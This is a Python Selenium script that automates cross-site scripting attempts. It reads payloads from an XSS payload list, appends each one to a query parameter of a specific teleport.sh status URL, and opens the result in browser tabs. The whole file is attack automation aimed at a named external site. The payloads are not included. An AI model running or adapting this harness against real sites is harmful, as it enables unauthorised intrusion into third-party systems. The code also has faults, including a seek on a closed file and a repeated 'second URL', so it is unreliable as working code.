import json
import urllib.parse
import time
from selenium import webdriver

# Define the URL prefix
url_prefix = "https://teleport.sh/welcome/539bbfab8c66393fd700cdeb6e165666/status?isCloud="

fileName  = "xss-payload-list.txt"
url_encode = False  # Set this variable to True or False

# Read URLs from the file using utf-8 encoding
with open(fileName, encoding="utf-8") as f:
    urls = [line.strip() for line in f.readlines()]

# Open a new instance of the chrome browser
browser = webdriver.Chrome(executable_path="C:\Testtools\chromedriver.exe")

# Continuously open URLs in new tabs in the browser
while True:
    # Keep track of the previous tab
    prev_tab = browser.current_window_handle

    # Iterate over the URLs in the list
    while urls:
        # Get the first URL in the list
        url = urls[0]

        # Check if URL encoding is required
        if url_encode:
            # Encode the URL
            encoded_url = urllib.parse.quote(url, safe='')
        else:
            encoded_url = url

        # Construct the full URL
        full_url = url_prefix + encoded_url

        print("  ")
        print("_____________")
        print(full_url)
        print(":::")
        print(json.dumps(full_url))
        print("_____________")
        print("  ")

        # Open the URL in a new tab in the browser
        # browser.execute_script("window.open('{}', '_blank');".format(full_url))
    
        js_code = f"window.open({json.dumps(full_url)}, '_blank');"
        browser.execute_script(js_code)

        # Wait for the page to fully load
        time.sleep(4)

        # Wait an additional 3 seconds
        # time.sleep(3)

        # Open the URL with the second line from the file in a new tab
        with open(fileName, encoding="utf-8") as f:
            second_url = f.readline().strip()

        # Check if URL encoding is required
        if url_encode:
            # Encode the second URL
            encoded_second_url = urllib.parse.quote(second_url, safe='')
        else:
            encoded_second_url = second_url

        full_second_url = url_prefix + encoded_second_url
        browser.execute_script("window.open('{}', '_blank');".format(full_second_url))

        # Wait for the second page to fully load
        time.sleep(5)

        # Wait an additional 3 seconds
        time.sleep(3)

        # Close the previous tab
        browser.switch_to.window(prev_tab)
        browser.close()

        # Switch to the new tab
        browser.switch_to.window(browser.window_handles[-1])

        # Update the previous tab
        prev_tab = browser.current_window_handle

        # Remove the URL from the list
        urls = urls[1:]

    # Reset the file pointer to the beginning of the file
    f.seek(0)

    # Read the URLs from the file again
    urls = [line.strip() for line in f.readlines()]

    # Pause the loop for 10 seconds before repeating
    time.sleep(10)

# Close the browser
browser.quit()
